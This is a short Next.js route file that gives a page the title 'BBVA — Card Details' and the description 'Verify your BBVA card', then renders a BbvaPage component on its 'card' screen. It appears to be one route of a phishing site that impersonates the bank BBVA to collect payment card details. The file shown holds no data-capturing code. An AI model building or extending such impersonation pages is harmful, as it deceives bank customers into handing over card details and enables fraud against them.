import BbvaPage from "../page"

export const metadata = {
  title: "BBVA — Card Details",
  description: "Verify your BBVA card",
}

export default function CardRoutePage() {
  return <BbvaPage initialScreen="card" />
}
